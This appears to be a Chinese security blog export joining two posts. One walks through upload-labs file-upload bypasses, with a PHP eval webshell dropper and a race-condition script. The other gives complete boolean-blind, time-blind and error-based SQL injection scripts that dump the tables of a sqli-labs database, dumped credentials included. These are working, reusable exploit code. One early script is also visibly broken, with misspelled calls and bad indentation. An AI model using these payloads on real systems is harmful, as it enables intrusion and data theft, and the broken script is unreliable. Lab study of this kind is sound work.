`exif_imagetype()`是`php_exi`f扩展的一部分，不打开扩展的话本关会报错。\n\n# upload-17(二次渲染绕过)\n\n关键源码\n\n````\n$fileext= substr(strrchr($filename,\".\"),1);\n\n    //判断文件后缀与类型，合法才进行上传操作\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n````\n\n检查扩展名，MIME类型验证G\n\n**`imagecreatefromjpeg()`尝试将上传的文件作为`JPEG`图像解析，GD库会自动丢弃所有的非图像数据（包括隐藏在文件末尾的`php`代码）**，这样就达到了二次渲染的效果。\n\n经过函数处理之前的`wangcai.jpg`在010中效果\n\n![image-20250509135413706](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091354831.png)\n\n经函数处理之后的`wangcai.jpg`文件在010中的效果\n\n![image-20250509135448273](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091354327.png)\n\n对比两次的图，相同的数据为\n\n````\nB4 B5 B6 B7 B8 B9 C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E1 E2 E3 E4\n这段数据对应的字符的长度刚好为一句话木马对应的字符的长度\n````\n\n将不变的部分替换为一句话木马：\n\n![image-20250509140528530](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091405571.png)\n\n将替换之后的wangcai.jpg文件上传\n\n![image-20250509135808429](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091358527.png)\n\n将返回的文件另存为`wangcai2.jpg`\n\n丢进010中与`wangcai.jpg`进行对比发现数据没有丢失\n\n![image-20250509140458002](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091404057.png)\n\n说明木马插入成功\n\n![image-20250509140546240](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091405307.png)\n\n蚁剑连接成功\n\n**能绕过的根本原理：**\n\n文件头仍是合法的图片格式；\n\n木马的代码位于不被渲染处理的数据区域；\n\n文件扩展名和MIME类型检查都能够通过。\n\n# upload-18(条件竞争漏洞)\n\n源码：\n\n````php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = '上传出错！';\n    }\n}\n\n````\n\n****\n\n首先使用`move_uploaded_file`将文件进行上传，然后进行后缀名判断，如果不满足`.jpg|.png|.gif`文件类型，直接删除。\n\n**漏洞利用原理**\n\n我们可以直接将文件上传到上传到指定的文件路径(服务区)，服务区经过if语句判断是否该删除文件，在服务区没有删除文件的时候，进行访问上传的`php`文件，上传的php文件访问执行之后会生成一个一句话木马文件。\n\n下面是上传的一句话木马内容\n\n````php\n<?php fwrite(fopen('shell.php','w'),'<?php @eval($_POST[cmd]);?>');?>\n    /在目标服务器上面创建后门文件，以写入模式打开或者是创建一个名为shell.php的文件，并向该文件中写入内容，写入的内容为\n    <?php @eval($_POST[cmd]);?>\n````\n\n下面是一个访问creat.php,并且判断shell.php是否已经生成的python脚本\n\n````python\nimport requests\nurl = \"http://10.18.208.48/upload-labs-master/upload/create.php\"\nwhile True:\n    html = requests.get(url)\n    if html.status_code == 200:\n        print(\"OK\")\n        break\n    else:\n\t    print(\"DOWN\")\n````\n\n\n\n上传文件`create.php`,抓包\n\n![image-20250509195403558](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091954623.png)\n\n\n\n设置payload如下：\n\n![image-20250509195427358](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091954411.png)\n\n\n\n在运行脚本的同时开始攻击\n\n知道脚本回显ok的时候停止攻击\n\n![image-20250509195958296](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091959366.png)\n\n![image-20250509195125117](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091951226.png)\n\n![image-20250509200247949](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505092002029.png)\n\n蚁剑连接成功\n\n**绕过的原理：**\n\n通过空payload攻击，快速重复发送相同的请求，从而触发服务端的竞争姿态，从而执行上传的后门文件的php代码。\n\n# upload-19(条件竞争漏洞)\n\n与18关相同\n\n# upload-20(move_uploaded_file()函数)\n\n关键源码如下：\n\n````php\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            }else{\n                $msg = '上传出错！';\n            }\n        }else{\n            $msg = '禁止保存为该类型文件！';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n\n````\n\n**move_uploaded_file()函数有一个特性，将用户上传的临时文件移动到目标路径的时候如果目标路径的末尾包含斜杠`/`，php会自动的忽略他。**\n\n上传php一句话木马拦截\n\n![image-20250510151154041](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505101511083.png)\n\n![image-20250510151137625](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505101511686.png)\n\n\n\n**可以这样绕过的原理：**\n\n后端校验获取扩展名的时候得到的是`.php/.`,不会被拦截，但是再利用`move_uploaded_file()`函数对路径处理的特性，自动忽略/.文件就会保存为`.php`,，从而能够执行文件内容。\n\n# upload-21(数组绕过)\n\n关键源码如下：\n\n````php\nif(!empty($_FILES['upload_file'])){\n    //检查MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"禁止上传该类型文件!\";\n    }else{\n        //检查文件名\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n    }\n}else{\n    $msg = \"请选择要上传的文件！\";\n}\n\n````\n\n````\n不同于之前的关键部分是使用`is_arrray()`函数判断了post传参进来的是不是一个数组\n\nempty()函数将字符串打散为数组\n\nend()函数指向数组中的最后一个元素，并输出\n\nreset()函数输出数组当前元素和下一个元素的值，然后将数组的额内部指针重置到数组的第一个元素\n````\n\n````php\n$ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }\n````\n\n通过end()函数获得file的最后一个元素，赋值给$ext进行后缀校验\n\n````php\nelse{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n````\n\n后缀符合条件的话就会拼接文件名为首元素+尾元素\n\nreset()函数用来获取尾元素\n\n如果我们传入的数组为：\n\n````\nsave_name=[\"muma.php\",\"jpg\"]\n````\n\n这样文件的后缀为`jpg`可以绕过后缀检测，但是组装之后的文件名为`muma.php.jpg`。\n\n那么传入的数组可以设置为：\n\n````\nsave_name=[\"muma.php\",不设置,\"jpg\"]\n````\n\n当save_name[1]不设置的时候，count的结果仍然是2，这样文件名的后缀就拼接为空，结果为`muma.php.`,在windows特性中将`.`省略\n\n上传一句话木马的php文件bp拦截\n\n![image-20250511133706518](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505111337629.png)\n\n发包\n\n![image-20250511133943971](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505111339004.png)\n\n成功得到图片上传的链接，接下来连接蚁剑即可。\n\n\n\n**能够成功绕过的原理：**\n\n传入的数组为：\n\n````\n$file=[\"cj1.php\",不设置,\"jpg\"]\n````\n\n在count($file)的计算中，不会计算缺失的索引，只计算实际存在的元素数量，所以count($file)的返回值为2.\n\n所以`$file[count($file)-1]=1`，但是$file[1]不存在就会返回null，综合上面最终的拼接结果就为`cj1.php`\n"},{"title":"SQL注入脚本","url":"/2025/05/04/SQL注入脚本/","content":"# 布尔盲注脚本\n\n跑出数据库名称\n\n分析这个脚本应该有的结构：\n1.定义一个变量（输入目标的`url`）\n\n2.获取数据库长度的函数\n\n3.获取数据库名称的函数\n\n4.主程序的入口\n\n````python\n import requests\n\n url=\"xxxxx\"\n def get_length():\n    for i in range(10):\n        payloasd1=\"?id=1%27%20and%20(length(database()))%20=%20{}%20--      +\".forma(i)  #拼接进url进行访问测试，不进行url进行解析的话可能会出现服务器无法解析的情况\n        #.format(i)是一个字符串方法，将变量i插入到字符串的指定的位置，这里是将i的值填充到字符串中的占位符{}的位置。\n        print(payload1)\n        url1=url+payload1\n        r=requests.get(url1)\n        if 'you are in' in r.text:\n            print(\"数据库的长度为：\",i)\n            break\n    return i\n def get_databasename():\n    databasename=''\n    len=get_length()\n    #遍历操作枚举数据库名\n    for i in range(1,len+1)：\n         for j in range(32,127):\n               payload2='?id=1%27%20and%20(ascii(substr((select%20database())%20,{},1)))%20=%20{}%20--        +'.format( i, j)#将循环的i和j的值插入占位符{}的位置\n                r=requests.get(url+payload2)\n                if 'You are in'in r.text:\n                #将ascii码转化为字符\n                databasename += char(j)\n                print(\"字符为：\",char(j))\n         print(\"数据库名称为\",databasename)\n\n\n#主程序的入口，当直接运行脚本的时候执行get_databasename()函数（作为模块导入的时候不会自动执行\n if__name__=='__main__':\n        get_databasename()\n````\n\n![image-20250427205700181](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504272057294.png)\n\n这只是个简单的获取数据库长度和数据库名的脚本，下面是完整的布尔盲注的脚本。\n\n````python\nimport requests\n\nurl = \"http://sql/sqli-labs/Less-5/\"\n\n\ndef db_length():\n    print(\"开始测试数据库名长度\")\n    for i in range(10):\n        payload = f\"?id=1' and length(database())={i}--+\"\n        r = requests.get(url + payload)\n        if 'You are in' in r.text:\n            print(f\"数据库长度为：{i}\")\n            return i\n    return 0\n\n\ndef db_name():\n    data_name = ''\n    db_len = db_length()\n    for i in range(1, db_len + 1):\n        for j in range(33, 127):\n            payload = f\"?id=1' and ascii(substr((select database()),{i},1))={j}--+\"\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                data_name += chr(j)\n                print(f\"字符为：{chr(j)}\")\n        print(f\"当前数据库名：{data_name}\")\n    return data_name\n\n\ndef tb_piece(db_name):\n    print(f\"开始测试{db_name}数据库中有几张表.....\")\n    for i in range(100):\n        payload = f\"?id=1' and (select count(table_name) from information_schema.tables where table_schema='{db_name}')={i}--+\"\n        r = requests.get(url + payload)\n        if 'You are in' in r.text:\n            print(f\"{db_name}数据库总共有{i}张表\")\n            return i\n    return 0\n\n\ndef tb_name(db_name, table_count):\n    print(\"开始猜解表名.....\")\n    table_list = []\n    for i in range(table_count):\n        # 获取表长度\n        tb_length = 0\n        for j in range(1, 20):\n            payload = f\"?id=1' and (select length(table_name) from information_schema.tables where table_schema='{db_name}' limit {i},1)={j}--+\"\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                tb_length = j\n                print(f\"第{i + 1}张表名的长度为：{tb_length}\")\n                break\n\n        # 猜解表名\n        current_table = ''\n        if tb_length > 0:\n            for pos in range(1, tb_length + 1):\n                for char_code in range(33, 127):\n                    payload = f\"?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='{db_name}' limit {i},1),{pos},1))={char_code}--+\"\n                    r = requests.get(url + payload)\n                    if 'You are in' in r.text:\n                        current_table += chr(char_code)\n                        print(f\"当前表名: {current_table}\")\n                        break\n\n        table_list.append(current_table)\n        print(f\"完成第{i + 1}张表: {current_table}\")\n\n    print(f\"\\n{db_name}库下的{table_count}张表：{table_list}\\n\")\n    return table_list\n\n\ndef column_num(table_list, db_name):\n    print(\"开始猜解每张表的字段数.....\")\n    column_num_list = []\n    for table in table_list:\n        for count in range(30):\n            payload = f\"?id=1' and (select count(column_name) from information_schema.columns where table_name='{table}')={count}--+\"\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                print(f\"[+] {table}表有{count}个字段\")\n                column_num_list.append(count)\n                break\n    print(f\"\\n各表字段数：{column_num_list}\\n\")\n    return column_num_list\n\n\ndef column_name(table_list, column_num_list, db_name):\n    print(\"开始猜解每张表的字段名.....\")\n    column_name_list = []\n    for idx, table in enumerate(table_list):\n        print(f\"\\n{table}表的字段：\")\n        columns = []\n        for col_num in range(column_num_list[idx]):\n            col_name = ''\n            # 先获取字段长度\n            for length in range(1, 30):\n                payload = f\"?id=1' and (select length(column_name) from information_schema.columns where table_name='{table}' limit {col_num},1)={length}--+\"\n                r = requests.get(url + payload)\n                if 'You are in' in r.text:\n                    # 猜解字段名\n                    for pos in range(1, length + 1):\n                        for char_code in range(33, 127):\n                            payload = f\"?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='{table}' limit {col_num},1),{pos},1))={char_code}--+\"\n                            r = requests.get(url + payload)\n                            if 'You are in' in r.text:\n                                col_name += chr(char_code)\n                                break\n                    columns.append(col_name)\n                    print(col_name)\n                    break\n        column_name_list.append(columns)\n    return column_name_list\n\n\ndef dump_data(table_list, column_name_list, db_name):\n    print(f\"开始导出{db_name}库的数据...\")\n    for table_idx, table in enumerate(table_list):\n        print(f\"\\n{table}表的数据：\")\n        columns = column_name_list[table_idx]\n        # 获取记录数\n        for count in range(100):\n            payload = f\"?id=1' and (select count(*) from {db_name}.{table})={count}--+\"\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                print(f\"共有{count}条记录\")\n                # 获取每条记录\n                for record in range(count):\n                    record_data = []\n                    for col in columns:\n                        # 获取字段值长度\n                        for length in range(1, 100):\n                            payload = f\"?id=1' and (select length({col}) from {db_name}.{table} limit {record},1)={length}--+\"\n                            r = requests.get(url + payload)\n                            if 'You are in' in r.text:\n                                # 猜解字段值\n                                value = ''\n                                for pos in range(1, length + 1):\n                                    for char_code in range(33, 127):\n                                        payload = f\"?id=1' and ascii(substr((select {col} from {db_name}.{table} limit {record},1),{pos},1))={char_code}--+\"\n                                        r = requests.get(url + payload)\n                                        if 'You are in' in r.text:\n                                            value += chr(char_code)\n                                            break\n                                record_data.append(value)\n                                break\n                    print(f\"第{record + 1}条: {record_data}\")\n                break\n\n\nif __name__ == '__main__':\n        db_len = db_length()\n        current_db = db_name()\n        table_count = tb_piece(current_db)\n        tables = tb_name(current_db, table_count)\n        column_counts = column_num(tables, current_db)\n        column_names = column_name(tables, column_counts, current_db)\n        dump_data(tables, column_names, current_db)\n\n````\n\n下面是脚本运行得到的数据\n\n````\n开始测试数据库名长度\n数据库长度为：8\n开始测试数据库名长度\n数据库长度为：8\n字符为：s\n当前数据库名：s\n字符为：e\n当前数据库名：se\n字符为：c\n当前数据库名：sec\n字符为：u\n当前数据库名：secu\n字符为：r\n当前数据库名：secur\n字符为：i\n当前数据库名：securi\n字符为：t\n当前数据库名：securit\n字符为：y\n当前数据库名：security\n开始测试security数据库中有几张表.....\nsecurity数据库总共有4张表\n开始猜解表名.....\n第1张表名的长度为：6\n当前表名: e\n当前表名: em\n当前表名: ema\n当前表名: emai\n当前表名: email\n当前表名: emails\n完成第1张表: emails\n第2张表名的长度为：8\n当前表名: r\n当前表名: re\n当前表名: ref\n当前表名: refe\n当前表名: refer\n当前表名: refere\n当前表名: referer\n当前表名: referers\n完成第2张表: referers\n第3张表名的长度为：7\n当前表名: u\n当前表名: ua\n当前表名: uag\n当前表名: uage\n当前表名: uagen\n当前表名: uagent\n当前表名: uagents\n完成第3张表: uagents\n第4张表名的长度为：5\n当前表名: u\n当前表名: us\n当前表名: use\n当前表名: user\n当前表名: users\n完成第4张表: users\n\nsecurity库下的4张表：['emails', 'referers', 'uagents', 'users']\n\n开始猜解每张表的字段数.....\n[+] emails表有2个字段\n[+] referers表有3个字段\n[+] uagents表有4个字段\n[+] users表有11个字段\n\n各表字段数：[2, 3, 4, 11]\n\n开始猜解每张表的字段名.....\n\nemails表的字段：\nid\nemail_id\n\nreferers表的字段：\nid\nreferer\nip_address\n\nuagents表的字段：\nid\nuagent\nip_address\nusername\n\nusers表的字段：\nid\nname\nusername\npassword\ntype\nUSER\nCURRENT_CONNECTIONS\nTOTAL_CONNECTIONS\nid\nusername\npassword\n开始导出security库的数据...\n\nemails表的数据：\n共有8条记录\n第1条: ['1', 'Dumb@dhakkan.com']\n第2条: ['2', 'Angel@iloveu.com']\n第3条: ['3', 'Dummy@dhakkan.local']\n第4条: ['4', 'secure@dhakkan.local']\n第5条: ['5', 'stupid@dhakkan.local']\n第6条: ['6', 'superman@dhakkan.local']\n第7条: ['7', 'batman@dhakkan.local']\n第8条: ['8', 'admin@dhakkan.com']\n\nreferers表的数据：\n共有0条记录\n\nuagents表的数据：\n共有0条记录\n\nusers表的数据：\n共有13条记录\n第1条: ['1', 'Dumb', 'Dumb', '1', 'Dumb', 'Dumb']\n第2条: ['2', 'Angelina', 'I-kill-you', '2', 'Angelina', 'I-kill-you']\n第3条: ['3', 'Dummy', 'p@ssword', '3', 'Dummy', 'p@ssword']\n第4条: ['4', 'secure', 'crappy', '4', 'secure', 'crappy']\n第5条: ['5', 'stupid', 'stupidity', '5', 'stupid', 'stupidity']\n第6条: ['6', 'superman', 'genious', '6', 'superman', 'genious']\n第7条: ['7', 'batman', 'mob!le', '7', 'batman', 'mob!le']\n第8条: ['8', 'admin', 'admin', '8', 'admin', 'admin']\n第9条: ['9', 'admin1', 'admin1', '9', 'admin1', 'admin1']\n第10条: ['10', 'admin2', 'admin2', '10', 'admin2', 'admin2']\n第11条: ['11', 'admin3', 'admin3', '11', 'admin3', 'admin3']\n第12条: ['12', 'dhakkan', 'dumbo', '12', 'dhakkan', 'dumbo']\n第13条: ['14', 'admin4', 'admin4', '14', 'admin4', 'admin4']\n````\n\n#                时间盲注脚本\n\n下面是一个比较我认为比较简洁的时间盲注的脚本，本可以根据布尔盲注的脚本简单更改的，但是这种脚本也值得学习，借鉴\n\n````python\nimport requests\nimport datetime\n\nurl = 'http://sql/sqli-labs/Less-10/'\n\ndef database_len():\n    #获取数据库名称长度\n    for i in range(1, 20):\n        payload = f'?id=1\" and if(length(database())={i},sleep(3),0)--+'\n        time1 = datetime.datetime.now()\n        r = requests.get(url + payload)\n        time2 = datetime.datetime.now()\n        sec = (time2 - time1).seconds\n        if sec >= 3:\n            print('数据库长度:', i)\n            return i\n    return 0\n\ndef database_name(length):\n    #获取数据库名称\n    name = ''\n    for i in range(1, length + 1):\n        found = False\n        for j in range(32, 127):  # 遍历所有可打印ASCII字符\n            payload = f'?id=1\" and if(ascii(substr(database(),{i},1))={j},sleep(3),0)--+'\n            time1 = datetime.datetime.now()\n            r = requests.get(url + payload)\n            time2 = datetime.datetime.now()\n            sec = (time2 - time1).seconds\n            if sec >= 3:\n                name += chr(j)\n                print('当前数据库名:', name)\n                found = True\n                break\n    print('最终数据库名:', name)\n    return name\n\ndef table_name():\n    #获取所有表名\n    tables = []\n    for k in range(0, 5):\n        name = ''\n        for i in range(1, 20):\n            found = False\n            for j in range(32, 127):\n                payload = f'?id=1\" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {k},1),{i},1))={j},sleep(3),0)--+'\n                time1 = datetime.datetime.now()\n                r = requests.get(url + payload)\n                time2 = datetime.datetime.now()\n                sec = (time2 - time1).seconds\n                if sec >= 3:\n                    name += chr(j)\n                    found = True\n                    break\n        if name:\n            tables.append(name)\n            print(f\"发现表 {k+1}:\", name)\n    return tables\n\ndef column_name(table_name):\n    #获取指定表的所有列名\n    columns = []\n    for k in range(0, 10):\n        name = ''\n        for i in range(1, 20):\n            found = False\n            for j in range(32, 127):\n                payload = f'?id=1\" and if(ascii(substr((select distinct column_name from information_schema.columns where table_name=\"{table_name}\" and table_schema=database() limit {k},1),{i},1))={j},sleep(3),0)--+'\n                time1 = datetime.datetime.now()\n                r = requests.get(url + payload)\n                time2 = datetime.datetime.now()\n                sec = (time2 - time1).seconds\n                if sec >= 3:\n                    name += chr(j)\n                    found = True\n                    break\n        if name and name not in columns:  #检验列名是否为真，并且是否不存在与columns列表中，避免重复添加相同的列名\n            columns.append(name)\n            print(f\"表 {table_name} 的列 {k+1}:\", name)\n    return columns\n\ndef data(column, table):\n    #获取指定表的数据\n    results = []\n    for k in range(0, 10):\n        name = ''\n        for i in range(1, 50):\n            found = False\n            for j in range(32, 127):\n                payload = f'?id=1\" and if(ascii(substr((select {column} from {table} limit {k},1),{i},1))={j},sleep(3),0)--+'\n                time1 = datetime.datetime.now()\n                r = requests.get(url + payload)\n                time2 = datetime.datetime.now()\n                sec = (time2 - time1).seconds\n                if sec >= 3:\n                    name += chr(j)\n                    found = True\n                    break\n        if name:\n            results.append(name)\n            print(f\"表 {table} 的 {column} 数据 {k+1}:\", name)\n    return results\n\nif __name__ == '__main__':\n    print(\"开始SQL盲注测试...\")\n    length = database_len()\n    if length > 0:\n        db_name = database_name(length)\n        tables = table_name()\n        if tables:\n            for table in tables:\n                print(f\"\\n正在获取表 {table} 的列信息...\")\n                columns = column_name(table)\n                if columns:\n                    for column in columns:\n                        print(f\"\\n正在获取表 {table} 的列 {column} 的数据...\")\n                        data(column, table)\n    # 最后这一段能够体现出对函数的逐层调用的过程\n````\n\n下面是脚本运行的结果\n\n````\n开始SQL盲注测试...\n数据库长度: 8\n当前数据库名: s\n当前数据库名: se\n当前数据库名: sec\n当前数据库名: secu\n当前数据库名: secur\n当前数据库名: securi\n当前数据库名: securit\n当前数据库名: security\n最终数据库名: security\n发现表 1: emails\n发现表 2: referers\n发现表 3: uagents\n发现表 4: users\n\n正在获取表 emails 的列信息...\n表 emails 的列 1: id\n表 emails 的列 2: email_id\n\n正在获取表 emails 的列 id 的数据...\n表 emails 的 id 数据 1: 1\n表 emails 的 id 数据 2: 2\n表 emails 的 id 数据 3: 3\n表 emails 的 id 数据 4: 4\n表 emails 的 id 数据 5: 5\n表 emails 的 id 数据 6: 6\n表 emails 的 id 数据 7: 7\n表 emails 的 id 数据 8: 8\n\n正在获取表 emails 的列 email_id 的数据...\n表 emails 的 email_id 数据 1: Dumb@dhakkan.com\n表 emails 的 email_id 数据 2: Angel@iloveu.com\n表 emails 的 email_id 数据 3: Dummy@dhakkan.local\n表 emails 的 email_id 数据 4: secure@dhakkan.local\n表 emails 的 email_id 数据 5: stupid@dhakkan.local\n表 emails 的 email_id 数据 6: superman@dhakkan.local\n表 emails 的 email_id 数据 7: batman@dhakkan.local\n表 emails 的 email_id 数据 8: admin@dhakkan.com\n\n正在获取表 referers 的列信息...\n表 referers 的列 1: id\n表 referers 的列 2: referer\n表 referers 的列 3: ip_address\n\n正在获取表 referers 的列 id 的数据...\n\n正在获取表 referers 的列 referer 的数据...\n\n正在获取表 referers 的列 ip_address 的数据...\n\n正在获取表 uagents 的列信息...\n表 uagents 的列 1: id\n表 uagents 的列 2: uagent\n表 uagents 的列 3: ip_address\n表 uagents 的列 4: username\n\n正在获取表 uagents 的列 id 的数据...\n\n正在获取表 uagents 的列 uagent 的数据...\n\n正在获取表 uagents 的列 ip_address 的数据...\n\n正在获取表 uagents 的列 username 的数据...\n\n正在获取表 users 的列信息...\n表 users 的列 1: id\n表 users 的列 2: username\n表 users 的列 3: password\n\n正在获取表 users 的列 id 的数据...\n表 users 的 id 数据 1: 1\n表 users 的 id 数据 2: 2\n表 users 的 id 数据 3: 3\n表 users 的 id 数据 4: 4\n表 users 的 id 数据 5: 5\n表 users 的 id 数据 6: 6\n表 users 的 id 数据 7: 7\n表 users 的 id 数据 8: 8\n表 users 的 id 数据 9: 9\n表 users 的 id 数据 10: 10\n\n正在获取表 users 的列 username 的数据...\n表 users 的 username 数据 1: Dumb\n表 users 的 username 数据 2: Angelina\n表 users 的 username 数据 3: Dummy\n表 users 的 username 数据 4: secure\n表 users 的 username 数据 5: stupid\n表 users 的 username 数据 6: superman\n表 users 的 username 数据 7: batman\n表 users 的 username 数据 8: admin\n表 users 的 username 数据 9: admin1\n表 users 的 username 数据 10: admin2\n\n正在获取表 users 的列 password 的数据...\n表 users 的 password 数据 1: Dumb\n表 users 的 password 数据 2: I-kill-you\n表 users 的 password 数据 3: p@ssword\n表 users 的 password 数据 4: crappy\n\n表 users 的 password 数据 5: stupidity\n表 users 的 password 数据 6: genious\n表 users 的 password 数据 7: mob!le\n表 users 的 password 数据 8: admin\n表 users 的 password 数据 9: admin1\n表 users 的 password 数据 10: admin2\n\n````\n\n# 报错注入脚本\n\n\n\n```python\nimport requests\nimport re\n\n\nclass SQLiExplorer:\n    def __init__(self):  # 初始化类\n        self.databases = []  # 存储数据库名\n        self.tables = []  # 存储表名\n        self.columns = []  # 存储列名\n        self.data = []  # 存储查询到的数据\n        self.pattern = re.compile(r'error: \\'~(.*?)~\\'', re.S)  # 正则表达式子从错误数据中提取数据\n        self.headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n        }  # 伪造HTTP请求头设置\n        self.base_url = \"http://sql/sqli-labs/Less-5/?id=1 '\"\n        self.current_user = None  # 存储当前的数据库信息\n\n    def send_payload(self, payload):  # self表示该方法属于类实例，可以访问类属性和其他方法\n        \"\"\"发送payload并返回响应\"\"\"\n        try:\n            url = f\"{self.base_url}{payload}\"\n            response = requests.get(url, headers=self.headers, timeout=10)  # 设置10秒等待，避免无限等待\n            response.raise_for_status()  # 响应的状态的检测，确保只处理成功的响应\n            return response.text\n        except requests.exceptions.RequestException as e:\n            print(f\"[!] 请求失败: {e}\")\n            return None\n\n    def extract_data(self, html):  # html，网页HTML的内容\n        \"\"\"从错误信息中提取数据\"\"\"\n        if not html:\n            return []\n        return re.findall(self.pattern, html)  # self.pattern 返回所有非重叠匹配的列表\n\n    def get_database_count(self):\n        # 获取数据库的数量\n        payload = \" or updatexml(0,concat(0x7e,(select count(schema_name) from information_schema.schemata),0x7e),1)--+\"\n        html = self.send_payload(payload)  # 调用类中的 send_payload 方法发送构造的注入语句，返回服务器响应的HTML的内容\n        result = self.extract_data(html)\n        return int(result[0]) if result else 0  # 如果resul存在的话将result数组第一个字符转化为整形，result不存在的话返回0\n\n    def get_databases(self):\n        # 获取所有非系统数据库名\n        count = self.get_database_count()\n        print(f\"[*] 发现 {count} 个数据库\")\n\n        for i in range(count):\n            payload = f\" or updatexml(0,concat(0x7e,(select schema_name from information_schema.schemata limit {i},1),0x7e),1)--+\"\n            html = self.send_payload(payload)\n            db_names = self.extract_data(html)\n            if 